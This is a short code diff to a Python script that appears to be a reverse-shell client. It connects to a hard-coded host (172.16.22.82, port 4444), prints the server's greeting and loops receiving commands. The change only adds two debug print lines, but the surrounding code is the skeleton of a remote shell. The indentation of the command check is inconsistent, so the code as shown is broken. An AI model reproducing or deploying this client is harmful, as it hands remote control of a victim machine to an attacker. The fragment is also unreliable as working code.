@@ -4,6 +4,8 @@ import platform
 import os
 import sysconfig
 
+print("caca")
+
 SERVER_HOST = "172.16.22.82"
 SERVER_PORT = 4444
 BUFFER_SIZE = 1024
@@ -12,6 +14,8 @@ s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 message = s.recv(BUFFER_SIZE).decode()
 print("Server:", message)
+
+print("caca2")
 while True:
   command = s.recv(BUFFER_SIZE).decode()
     if command.lower() == "exit":
